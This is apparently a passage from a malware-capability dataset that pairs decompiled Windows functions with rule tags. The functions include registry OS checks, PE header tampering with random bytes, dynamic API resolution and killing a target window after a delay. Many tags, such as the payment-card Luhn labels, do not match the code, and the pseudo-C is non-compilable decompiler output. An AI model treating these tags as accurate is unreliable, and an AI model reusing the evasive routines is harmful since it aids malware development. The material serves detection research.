-4) = puVar23;\n        cVar1 = '\\x1e';\n        do {\n            puVar23 = puVar23 + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *puVar23;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        *(puVar21 + -0x80) = puVar21 + -4;\n        uVar9 = in(0x78);\n        return uVar9;\n    }\ncode_r0x00404e94:\n    *(uVar6 + 0xf) = 0xd8;\n    if ((!bVar29) && (bVar29)) {\n        puVar19 = puVar21 + -4;\n        *(puVar21 + -4) = puVar23;\n        cVar1 = '\\x1e';\n        do {\n            puVar23 = puVar23 + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *puVar23;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        *(puVar21 + -0x80) = puVar21 + -4;\n        uVar9 = in(0x78);\n        return uVar9;\n    }\n    *(uVar6 + 0x10) = 0x91;\n    *(puVar21 + -4) = uVar14;\n    *(puVar21 + -6) = uVar10;\n    *(puVar21 + -8) = uVar11;\n    puVar12 = uVar11 & 0xffff0000 | *(puVar21 + -8);\n    uVar8 = *(puVar21 + -6);\n    uVar11 = uVar10 & 0xffff0000 | uVar8;\n    uVar14 = *(puVar21 + -4);\n    *(uVar6 + 0x11) = 0xd;\n    *(puVar21 + -4) = uVar9;\n    uVar5 = CONCAT11(((uVar9 >> 8) - uVar14) + 'M', uVar9) & 0x26ae;\n    bVar30 = SBORROW2(uVar5, 1);\n    bVar29 = uVar5 - 1 < 0;\n    uVar9 = *(puVar21 + -4);\n    *(uVar6 + 0x12) = 0xd2;\n    if ((uVar5 != 1) && (uVar5 == 1)) {\n        bVar30 = false;\n        uVar9 = uVar9 & 0xe2f4cc58;\n        bVar29 = uVar9 < 0;\n    }\n    *(uVar6 + 0x13) = 0x49;\n    if ((bVar30 == bVar29) && (uVar11 = uVar10 & 0xffff0000 | uVar8,  bVar30 != bVar29)) {\n        *(uVar9 + 0x8316dbec) = in_ST0;\n        puVar20 = puVar21 + -4;\n        puVar21 = puVar21 + -4;\n        *puVar20 = uVar14;\n        uVar4 = uVar9 - 1;\n        uVar3 = 9 < (uVar4 & 0xf) | in_AF;\n        uVar4 = uVar4 + uVar3 * '\\x06';\n        uVar7 = *puVar12;\n        *puVar12 = *puVar12 + 0x46c6df84;\n        uVar9 = uVar9 - 1 & 0xffffff00 |\n                uVar4 + (0x90 < (uVar4 & 0xf0) | uVar3 * (0xf9 < uVar4)) * '`' + 'A' + (0xb939207b < uVar7);\n    }\n    else {\n        *(uVar6 + 0x14) = 0x41;\n    }\n    *(puVar21 + -4) = uVar9;\n    *(puVar21 + -8) = uVar11;\n    *(puVar21 + -0xc) = puVar12;\n    *(puVar21 + -0x10) = uVar14;\n    *(puVar21 + -0x14) = puVar21;\n    *(puVar21 + -0x18) = puVar23;\n    *(puVar21 + -0x1c) = uVar6;\n    *(puVar21 + -0x20) = puVar26;\n    uVar28 = *(puVar21 + -0x20);\n    uVar25 = *(puVar21 + -0x1c);\n    iVar24 = *(puVar21 + -0x18);\n    uVar15 = *(puVar21 + -0x10);\n    uVar13 = *(puVar21 + -0xc);\n    uVar14 = *(puVar21 + -8);\n    iVar22 = *(iVar24 + 8);\n    *(iVar22 + 0x15) = 0x30;\n    *(puVar21 + -4) = iVar22;\n    *(puVar21 + -8) = uVar14;\n    *(puVar21 + -0xc) = uVar13;\n    *(puVar21 + -0x10) = uVar15;\n    *(puVar21 + -0x14) = puVar21;\n    *(puVar21 + -0x18) = iVar24;\n    *(puVar21 + -0x1c) = uVar25;\n    *(puVar21 + -0x20) = uVar28;\n    iVar22 = *(puVar21 + -0x18);\n    uVar14 = *(puVar21 + -4);\n    *(*(iVar22 + 8) + 0x16) = 0xc;\n    *(puVar21 + -4) = uVar14;\n    uVar9 = *(puVar21 + -4);\n    **(iVar22 + 0xc) = 0x17;\n    return uVar9;\n}\n",
        "token_count": 3471
    },
    "00403c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403c20(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00404c50;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "004041e0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.004041e0(void)\n\n{\n    int16_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar4 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    pcbData = 0x104;\n    *(puVar4 + 2) = 0;\n    iVar1 = *0x10;\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)\n                      (0x80000002, 0x407478, 0x4074a0, iVar1 + -0xc, iVar1 + -0x110, iVar1 + -8);\n    if (iVar3 != 0) {\n        return false;\n    }\n    puVar2 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar2 == NULL) {\n        return false;\n    }\n    *puVar2 = 0;\n    iVar3 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar3 == 6) {\n        return true;\n    }\n    return iVar3 == 7;\n}\n",
        "token_count": 345
    },
    "004011b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011f2) overlaps instruction at (ram,0x004011f1)\n// \n// WARNING: Removing unreachable block (ram,0x004011f2)\n\nuint fcn.004011b0(uint param_1, uint32_t param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_EDI;\n    uint16_t in_DS;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(param_1, param_2);\n    if (iVar1 != 0) {\n        if ((-1 < iVar1) && (param_2 = param_2 & 0xffff,  -1 >= iVar1)) {\n            out(0xc4, iVar1);\n            param_2 = in_DS;\n            *unaff_EDI = iVar1;\n        }\n        (*_sym.imp.MSVCRT.dll_fwrite)(param_3, 1, param_4, iVar1, param_2);\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 274
    },
    "00401650": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401729) overlaps instruction at (ram,0x00401728)\n// \n// WARNING: Removing unreachable block (ram,0x004017ba)\n\nvoid fcn.00401650(uint param_1, uint param_2, uint param_3, int32_t param_4, uint8_t *param_5, int32_t *param_6, \n                 uint *param_7)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int16_t extraout_CX;\n    int32_t extraout_ECX;\n    uint8_t uVar4;\n    uint extraout_EDX;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_stack_fffffec0;\n    int32_t in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint *puVar7;\n    uchar auStack13 [4];\n    uint uStack9;\n    \n    fcn.00401e60(param_5, param_6, param_1, 0x20, param_7 + 8);\n    fcn.00401e60(param_5, param_6, param_2, 0x20, param_7 + 0x18);\n    uVar5 = 0;\n    cVar6 = (extraout_CX - 1U & param_6 | 0x61be) == 0;\n    while( true ) {\n        puVar7 = 0x4016e9;\n        fcn.00401e60(param_5, param_6, param_3, 0x20, param_7 + 0x28);\n        if ((uVar5) || (!uVar5)) break;\n        iVar3 = extraout_ECX + -1;\n        param_3 = extraout_EDX;\n        if (extraout_ECX + -1 == 0 || cVar6 == '\\0') {\ncode_r0x004016f5:\n            uVar1 = *param_7;\n            *param_6 = param_7 + 1;\n            cVar6 = *0x9750e2b5 >> 8;\n            pcVar2 = *0x9750e2b5 & 0xffff0000 | CONCAT11(*0x9750e2b5 + -0x73 + uVar5, cVar6);\n            *pcVar2 = *pcVar2 + cVar6;\n            uVar4 = uVar1 >> 0x1f;\n            pcVar2[0x6a] = pcVar2[0x6a] + uVar4;\n            *(iVar3 + 0x57) = *(iVar3 + 0x57) & uVar4;\n            fcn.00401e60(param_5, in_stack_fffffec0, in_stack_fffffec4, in_stack_fffffec8, puVar7);\n            if ((-1 < &stack0xfffffee4) && (-1 >= &stack0xfffffee4)) {\n                *param_5 = *param_5 & 0xc3;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            iVar3 = func_0x00401600();\n            if (iVar3 == -1) {\n                iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n                *0x8bb8ed64 = iVar3 % 5;\n            }\n            else {\n                *0x8bb8ed64 = iVar3;\n            }\n            puVar7 = &stack0xfffffef0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            uStack9 = 0x104;\n            *(puVar7 + 2) = 0;\n            iVar3 = fcn.004033c0(0x80000001, 0x407270, 0x40729c, &stack0xfffffff3, &stack0xfffffeef, &stack0xfffffff7);\n            if ((iVar3 != 0) && (iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(&stack0xfffffeef, 0x4072ec),  iVar3 == 0)) {\n                *0x8bb8ed64 = *0x8bb8ed64 | 0x80;\n            }\n            return;\n        }\n    }\n    puVar7 = param_7 + 0x38;\n    in_stack_fffffec8 = 0x20;\n    iVar3 = param_4;\n    in_stack_fffffec0 = param_6;\n    in_stack_fffffec4 = param_4;\n    goto code_r0x004016f5;\n}\n",
        "token_count": 1089
    },
    "00401810": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401810(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00403d20(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00403d20(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 163
    },
    "00401a40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a60) overlaps instruction at (ram,0x00401a5f)\n// \n// WARNING: Removing unreachable block (ram,0x00401aa0)\n\nbool fcn.00401a40(void)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if ((-1 < &var_10ch) && (-1 >= &var_10ch)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = fcn.004033c0(0x80000002, 0x407308, 0x407348, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 270
    },
    "00402020": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402081) overlaps instruction at (ram,0x00402080)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402020(uint arg_8h, uint lpBuffer, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    ushort in_SS;\n    bool bVar2;\n    bool bVar3;\n    uint var_4h;\n    \n    *0x425628 = fcn.00401a40();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    bVar2 = false;\n    if (*0x425628 != 0) {\n        iVar1 = fcn.00401f60(arg_8h_00);\n        bVar2 = (iVar1 != 0) != 0;\n        *0x425628 = 1 - (iVar1 != 0);\n    }\n    bVar3 = (POPCOUNT(*0x425628 & 0xff) & 1U) == 0;\n    if ((!bVar3) && (bVar3)) {\n        segment(in_SS, *0x10 + -0x44);\n        if (bVar2) {\n            return 1;\n        }\n        if (bVar3) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.004012b0(0, arg_8h_00);\n    if (*0x425628 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 455
    },
    "004039a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a57) overlaps instruction at (ram,0x00403a54)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00403a4b)\n// WARNING: Removing unreachable block (ram,0x00403a1f)\n// WARNING: Removing unreachable block (ram,0x00403a27)\n\nchar * __cdecl fcn.004039a0(int16_t *arg_8h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    uint32_t *puVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t in_ECX;\n    uint32_t uVar7;\n    int32_t unaff_EBX;\n    uchar *puVar8;\n    uint32_t unaff_ESI;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint32_t *unaff_EDI;\n    uint *puVar11;\n    ushort in_SS;\n    bool bVar12;\n    bool bVar13;\n    uint *puStack24;\n    uint var_4h;\n    \n    puVar10 = &stack0xfffffffc;\n    if (*arg_8h != 0x5a4d) {\n        return NULL;\n    }\n    bVar12 = CARRY4(*(arg_8h + 0x1e), arg_8h);\n    puVar4 = *(arg_8h + 0x1e) + arg_8h;\n    bVar13 = (POPCOUNT(puVar4 & 0xff) & 1U) == 0;\n    if ((!bVar13) && (bVar13)) {\n        puVar5 = segment(in_SS, *0x10 + -0x14);\n        arg_8h = 0xb7bc9ea5;\n        if (bVar12) {\n            arg_8h = 0xb7bc9ea5;\n            puVar4 = unaff_EDI;\n            goto code_r0x00403a2e;\n        }\n        if (bVar13) {\n            pcVar3 = in(0x5d);\n            return pcVar3;\n        }\n        puVar4 = *puVar5;\n        unaff_EDI = 0xb7bc9ea5;\n    }\n    if (*puVar4 != 0x4550) {\n        return NULL;\n    }\n    in_ECX = puVar4[0x16];\ncode_r0x00403a2e:\n    if (in_ECX != 0) {\n        return NULL;\n    }\n    uVar7 = *(arg_8h + 0x1e);\n    if (uVar7 < 0x81) {\n        return NULL;\n    }\n    if ((0x7f < uVar7) && (0x7f >= uVar7)) {\n        if (&stack0xffffffec < *puVar4 || puVar4 + 1 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        return puVar4 + 1;\n    }\n    uVar7 = 0x40;\n    if (*(arg_8h + 0x1e) < 0xc0) {\n        uVar7 = *(arg_8h + 0x1e) - 0x80;\n    }\n    puStack24 = uVar7;\n    puVar5 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    if (puVar5 == NULL) {\n        return NULL;\n    }\n    if ((puVar5 < 1) || (0 < puVar5)) {\n        unaff_ESI = 0;\n    }\n    bVar12 = uVar7 == 0;\n    if (!bVar12) {\n        do {\n            puStack24 = 0x403b11;\n            iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar9 = unaff_ESI + 1;\n            bVar12 = uVar9 == uVar7;\n            *(unaff_ESI + puVar5) = iVar6 % 0xff;\n            unaff_ESI = uVar9;\n        } while (uVar9 < uVar7);\n    }\n    puVar8 = &stack0xfffffffc;\n    if ((!bVar12) && (puVar8 = &stack0xfffffffc,  bVar12)) {\n        puVar11 = &stack0xffffffe8;\n        puVar8 = &stack0xffffffe8;\n        cVar1 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar10;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    puVar10 = puVar5;\n    puVar11 = *(puVar8 + 8) + 0x80;\n    for (uVar9 = uVar7 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar11 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar11 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    puStack24 = puVar5;\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n    uVar7 = (0xfffffffb < &stack0xffffffe8) + 0x76e85030;\n    uVar2 = uVar7 + (0x8917afcf < (0xfffffffb < &stack0xffffffe8));\n    pcVar3 = uVar7 & 0xffffff00 | uVar2;\n    *(unaff_EBX + 0x1b804c4) = *(unaff_EBX + 0x1b804c4) + uVar2;\n    *pcVar3 = *pcVar3 + uVar2;\n    *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e) + unaff_EBX;\n    return pcVar3;\n}\n",
        "token_count": 1432
    },
    "00403f80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404086) overlaps instruction at (ram,0x00404082)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00404021)\n\nvoid __fastcall fcn.00403f80(uint param_1, int32_t param_2, uchar *param_3)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    int32_t unaff_EBX;\n    uint32_t *puVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint8_t *unaff_EDI;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    bool in_CF;\n    uint8_t in_AF;\n    bool bVar15;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 in_ST0;\n    uint16_t uStack20;\n    uint16_t uStack18;\n    \n    uVar2 = in_EAX;\n    *param_3 = 0xc6;\n    if ((!in_CF) && (in_CF)) {\n        cVar1 = uVar2 - *unaff_EDI;\n        uStack20 = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                   (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                   ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI;\n        uStack18 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n        func_0x10189f20();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    param_3[1] = 6;\n    if ((!in_CF && uVar2 != 1) && (in_CF || uVar2 == 1)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    param_3[2] = 0xaf;\n    if ((uVar2 < '\\x01') || ('\\0' < uVar2)) {\n        param_3[3] = 0xaa;\n    }\n    puVar9 = &uStack20 ^ *(unaff_EBX + -0x3a);\n    iVar5 = *(param_2 + 0x51665066);\n    puVar9[-1] = unaff_EDI;\n    uVar12 = puVar9[-1];\n    uVar6 = *puVar9;\n    uVar4 = *(puVar9 + 2);\n    *(in_EAX + 5) = 0x41;\n    *puVar9 = param_2;\n    puVar9[-1] = uVar12;\n    uVar13 = puVar9[-1];\n    uVar7 = *puVar9;\n    puVar10 = puVar9 + 1;\n    *(in_EAX + 6) = 0x94;\n    *(in_EAX + 7) = 0x46;\n    *(puVar9 + 2) = uVar7;\n    *(puVar9 + -2) = param_3 & 0xffff0000 | uVar4;\n    uVar12 = *(puVar9 + -2);\n    uVar4 = *(puVar9 + 2);\n    *(in_EAX + 8) = 0x5d;\n    *puVar9 = uVar12;\n    puVar9[-1] = uVar6 & 0xff | (uVar6 >> 8) << 8;\n    puVar9[-2] = uVar7 & 0xffff0000 | uVar4;\n    puVar9[-3] = unaff_EBX;\n    puVar9[-4] = puVar9 + 1;\n    puVar9[-5] = &stack0xfffffffc + iVar5;\n    puVar9[-6] = in_EAX + 1;\n    puVar9[-7] = uVar13;\n    uVar14 = puVar9[-7];\n    iVar11 = puVar9[-5];\n    uVar13 = puVar9[-3];\n    piVar8 = puVar9[-2];\n    uVar12 = puVar9[-1];\n    iVar5 = *(iVar11 + 8);\n    *(iVar5 + 8) = 3;\n    *puVar9 = uVar12;\n    bVar15 = (uVar12 - 1U & uVar14 | 0x61be) < 0;\n    *(iVar5 + 9) = 1;\n    if ((bVar15) || (!bVar15)) {\n        iVar5 = *(iVar11 + 0xc);\n        puVar10 = puVar9 + 2;\n    }\n    *(iVar5 + -0x7ce92414) = in_ST0;\n    *(puVar10 + -4) = uVar13;\n    uVar3 = iVar5 - 1U;\n    uVar2 = 9 < (uVar3 & 0xf) | in_AF;\n    uVar3 = uVar3 + uVar2 * '\\x06';\n    *piVar8 = *piVar8 + 0x458bdf84;\n    *(iVar5 - 1U & 0xffffff00 | uVar3 + (0x90 < (uVar3 & 0xf0) | uVar2 * (0xf9 < uVar3)) * '`' | 0x5f) = 10;\n    return;\n}\n",
        "token_count": 1431
    },
    "004040a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040a0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403f80(&var_68h, &var_4h);\n    fcn.00403140(&var_68h, var_4h, 0x4074a8, 0xa140);\n    *arg_8h = 0x4074a8;\n    *arg_ch = 0xa140;\n    return;\n}\n",
        "token_count": 241
    },
    "004048d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404981)\n\nuint __cdecl fcn.004048d0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(*0x10 + -0x10c, 0xec);\n    if (iVar1 == 0) {\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x4850, 0);\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 391
    },
    "00401180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401180(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "004014f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040159a) overlaps instruction at (ram,0x00401599)\n// \n\ncode * fcn.004014f0(void)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint *puVar5;\n    uint8_t uVar6;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    int32_t extraout_ECX_00;\n    int32_t unaff_EBX;\n    int32_t *piVar8;\n    bool bVar9;\n    char cVar10;\n    bool bVar11;\n    bool bVar12;\n    ulong uVar13;\n    char acStack97 [41];\n    int32_t *piStack56;\n    uint *puStack52;\n    uchar *puStack48;\n    uint *puStack44;\n    uint uStack24;\n    uint hModule;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack24 = 0x40711c;\n    piStack56 = NULL;\n    uVar13 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    puStack52 = uVar13;\n    bVar9 = false;\n    bVar12 = false;\n    bVar11 = puStack52 < 0;\n    cVar10 = puStack52 == NULL;\n    puVar5 = puStack52;\n    iVar7 = extraout_ECX;\n    while( true ) {\n        if (cVar10) {\n            return NULL;\n        }\n        piVar8 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (bVar9) break;\n        while( true ) {\n            piVar8 = _sym.imp.KERNEL32.dll_GetProcAddress;\n            if (!bVar9) goto code_r0x00401530;\n            iVar7 = iVar7 + -1;\n            if (iVar7 == 0 || cVar10 == false) {\n                _pe_dos_header = puStack52 + 1;\n                puStack52 = 0x8bb8ec44;\n                bVar9 = *0x9750e2b5 < sym.imp.KERNEL32.dll_GetProcAddress;\n                cVar10 = *0x9750e2b5 == sym.imp.KERNEL32.dll_GetProcAddress;\n                piVar8 = piStack56;\n                goto code_r0x00401530;\n            }\n            if (bVar12 != bVar11) {\n                *(puVar5 + 0x66) = *(puVar5 + 0x66) + (puVar5 >> 8);\n                goto code_r0x0040155e;\n            }\n            puVar5 = puVar5 + 1;\n            puVar2 = unaff_EBX + -0x76097a10;\n            uVar6 = iVar7;\n            bVar9 = CARRY1(*puVar2, uVar6);\n            bVar12 = SCARRY1(*puVar2, uVar6);\n            *puVar2 = *puVar2 + uVar6;\n            bVar11 = *puVar2 < '\\0';\n            cVar10 = *puVar2 == 0;\n            if (cVar10) break;\n            *puVar5 = *puVar5 + puVar5;\n            puVar2 = (uVar13 >> 0x20) + 0x17;\n            uVar6 = uVar13 >> 0x28;\n            bVar9 = CARRY1(*puVar2, uVar6);\n            bVar12 = SCARRY1(*puVar2, uVar6);\n            *puVar2 = *puVar2 + uVar6;\n            bVar11 = *puVar2 < '\\0';\n            cVar10 = *puVar2 == 0;\n        }\n    }\ncode_r0x00401530:\n    do {\n        *0x4255fc = (*piVar8)();\n        piStack56 = piVar8;\n        if ((bVar9) || (!bVar9)) {\n            puVar5 = (*piVar8)();\ncode_r0x0040155e:\n            puStack44 = &uStack24;\n            *0x425600 = puVar5;\n            *0x425604 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n            if (((*0x4255fc != 0) && (*0x425600 != NULL)) && (*0x425604 != 0)) {\n                return 0x1;\n            }\n            return NULL;\n        }\n        if (extraout_ECX_00 == 1 || cVar10 == '\\0') {\n            uVar3 = *puStack52;\n            *piVar8 = puStack52 + 1;\n            puStack52 = 0x68b8ec44;\n            pcVar4 = *0x9750e2b5 + -1;\n            if (!SBORROW4(*0x9750e2b5, 1)) {\n                